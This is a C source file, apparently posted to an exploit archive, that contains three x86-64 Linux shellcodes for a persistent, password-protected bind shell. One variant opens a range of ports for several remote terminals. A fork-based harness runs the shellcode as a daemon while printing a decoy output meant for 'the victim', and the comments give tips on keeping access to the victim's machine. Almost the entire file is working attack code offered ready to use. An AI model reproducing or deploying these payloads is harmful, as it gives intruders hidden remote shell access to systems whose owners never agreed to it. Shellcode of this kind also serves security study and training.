#include <stdio.h>
#include <string.h>

//| Exploit Title: [Syscall Persistent Bind Shell + (multi-terminal) + password + daemon (83, 148, 177 bytes)]
//| Date: [7/15/2016]
//| Exploit Author: [CripSlick]
//| Tested on: [Kali 2.0 x86_x64]
//| Version: [No Program Version, Only Syscalls Used]

//| ShepherdDowling@gmail.com
//| OffSec ID: OS-20614
//| http://50.112.22.183/


//|=========================================================================================
//|=============== CripSlick's Persistent Bind-Shell with Port-Range + password ============
//|
//|
//|	CODE 3 Has everything to offer that CODE2 has and more. CODE2 has everything to offer
//|	that CODE1 has and more. CODE1 is still great due to being a very short bind shell.
//|	The point is that that there is really ONLY 1 shellcode here, it is just that CODE2 &
//|	CODE1 have less features to cut down on byte count giving you more options.
//|
//|	Troubleshooting:
//|	1. Problem: A lot of ports appeared on "nmap <IPv4> -p-" but not my port?
//|	1. Answer:  This is common when you swap the high and low port
//|
//|	2. Problem: I disconnected and can't reconnect (even when I use the right password)
//|	2. Answer:  This is common when re-executing the program (even after making changes)
//|		    Solve this by closing the terminal completly out, going to your directory
//|		    recompiling the program and then relaunching.
//|
//|		    If it is because you typed in the password wrong, wait about 60 seconds to
//|		    re-connect. No re-execution of the program is required to reconnect for
//|		    CODE2 & CODE3.
//|
//|	3. Problem: I DoS'd the victim
//|	3. Answer:  This probably was because you set the port range too broad. A broad port range
//|		    takes a lot of CPU power. I suggest keeping it to how many terminals you need.
//|



#define PORT 		"\x11\x5a"   // FORWARD BYTE ORDER
//|			PORT: 4442
#define PASSWORD	"\x6c\x61\x20\x63\x72\x69\x70\x73" // FORWARD BYTE ORDER
//|			PASSWORD = "la crips"

//| ONLY CODE3 DOES NOT USE "PORT"; IT USES "LOW_PORT" & "HIGH_PORT"
#define HIGH_PORT	"\x5f\x11"   // REVERSE BYTE ORDER
#define LOW_PORT	"\x5b\x11"   // REVERSE BYTE ORDER
//|			PORTS: 4443-4447 (remember 4443 doesn't count so 4444-4447)
//|					 (remember to use one terminal connection per open port)

//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!=======================
//| =========================================================================
//| CODE1 The short bind shell (83 bytes)
//| =========================================================================
//| This is the shortest bind-shell I could make. I leaned that mov byte takes
//| two bytes while Push+Pop takes 3 so I used more moves. Push+Pop is good if
//| you don't want to xor a register but your stack must be NULL on top.
//| This code only supports one terminal.

unsigned char CODE1[] = //replace CODE1 for both CODEX   <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
"\x48\x31\xff\x48\xf7\xe7\x40\xb7\x02\x6a\x01\x5e\xb0\x29\x0f\x05\x48"
"\x97\x6a\x02\x66\xc7\x44\x24\x02"PORT"\x54\x5e\x52\xb2\x10\xb0\x31"
"\x0f\x05\x5e\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x40\x88\xc7\x40\xb6\x03"
"\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31\xf6\x48\xf7\xe6\x50\x48\xbb"
"\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";

//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!=======================
//| =========================================================================
//| CODE2 Persistent bind shell with a password (148 bytes)
//| =========================================================================
//| Supports re-connecting after a disconnect (close terminal and open up again)
//| If you type in a password wrong, wait 60 seconds to reconnect.
//| If you close the terminal after you enter the correct password, you can
//| immediatly reconnect.
//| This code only supports one terminal.


unsigned char CODE2[] = //replace CODE2 for both CODEX   <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
"\x48\x31\xff\x48\xf7\xe7\x48\x31\xf6\x6a\x39\x58\x0f\x05\x48\x31\xff"
"\x48\x39\xf8\x74\x79\x48\x31\xff\x48\xf7\xe7\x40\xb7\x02\x6a\x01\x5e"
"\xb0\x29\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02"PORT"\x54\x5e"
"\x52\xb2\x10\xb0\x31\x0f\x05\x5e\xb0\x32\x0f\x05\xb0\x2b\x0f\x05\x40"
"\x88\xc7\x40\xb6\x03\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x89\xc7\x48"
"\x89\xc6\x48\x8d\x74\x24\xf0\x6a\x10\x5a\x0f\x05\x48\xb8"PASSWORD""
"\x48\x8d\x3e\x48\xaf\x74\x05\x6a\x3c\x58\x0f\x05\x48\x31\xf6\x48\xf7"
"\xe6\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b"
"\x0f\x05\xe9\x6c\xff\xff\xff";


//|=====================!!!CHOSE ONLY ONE SHELLCODE!!!=======================
//| =========================================================================
//| CODE3 Persistent bind shell with multi-port/terminal + password (177 bytes)
//| =========================================================================
//| This bind shell has everything COD2 has to offer + more while only 29 bytes more
//| You will get as many terminals on the victim as your PORT-RANGE minus 1
//| Your lowest port will NOT be open (so minus 1 port/terminal from your range)
//| Example: ports 4440-4445 = ports 4441-4445 usable = 5 terminals on victim


unsigned char CODE3[] = //replace CODE3 for both CODEX   <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
"\x48\x31\xf6\x56\x66\x68"HIGH_PORT"\x5b\x48\xff\xcb\x66\x81\xfb"LOW_PORT""
"\x75\x06\x50\x66\x68"HIGH_PORT"\x5b\x48\x31\xff\x48\xf7\xe7\xb0\x39\x0f"
"\x05\x48\x31\xff\x48\x39\xf8\x74\x7b\x48\x31\xff\x48\xf7\xe7\x40\xb7\x02"
"\x6a\x01\x5e\xb0\x29\x0f\x05\x48\x97\x86\xdf\x6a\x02\x66\x89\x5c\x24\x02"
"\x86\xdf\x54\x5e\x52\xb2\x10\xb0\x31\x0f\x05\x5e\xb0\x32\x0f\x05\xb0\x2b"
"\x0f\x05\x40\x88\xc7\x40\xb6\x03\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x89"
"\xc7\x48\x89\xc6\x48\x8d\x74\x24\xf0\x6a\x10\x5a\x0f\x05\x48\xb8"PASSWORD""
"\x48\x8d\x3e\x48\xaf\x74\x05\x6a\x3c\x58\x0f\x05\x48\x31\xf6\x48\xf7\xe6"
"\x50\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\xb0\x3b\x0f\x05"
"\x48\x31\xff\x48\xf7\xe7\xe9\x58\xff\xff\xff";



//|========================== VOID SHELLCODE ===========================
void SHELLCODE()
{
//	This part floods the registers to make sure the shellcode will always run
	__asm__("mov $0xAAAAAAAAAAAAAAAA, %rax\n\t"
		"mov %rax, %rbx\n\t" "mov %rax, %rcx\n\t" "mov %rax, %rdx\n\t"
		"mov %rax, %rsi\n\t" "mov %rax, %rdi\n\t" "mov %rax, %rbp\n\t"
		"mov %rax, %r10\n\t" "mov %rax, %r11\n\t" "mov %rax, %r12\n\t"
		"mov %rax, %r13\n\t" "mov %rax, %r14\n\t" "mov %rax, %r15\n\t"
		"call CODE3");  //1st CODEX<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
}

//|========================== VOID printBytes ===========================
void printBytes()
{
printf("The CripSlick's code is %d Bytes Long\n",
		strlen(CODE3)); //2nd CODEX<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
}


//|============================== Int main ================================
int main ()
{

//	IMPORTANT> replace CODEX  the "unsigned char" variable  below
//	> This needs to be done twice (for string count + code to use)

int pid = fork();  		// fork start
    if(pid == 0){ 		// pid always starts at 0

	SHELLCODE();		// launch void SHELLCODE
				// this is to represent a scenario where you bind to a good program
				// you always want your shellcode to run first

	}else if(pid > 0){	// pid will always be greater than 0 after the 1st process
				// this argument will always be satisfied

	printBytes();		// launch printBYTES
				// pretend that this is the one the victim thinks he is only using
	}
return 0;			// satisfy int main
system("exit");			// keeps our shellcode a daemon
}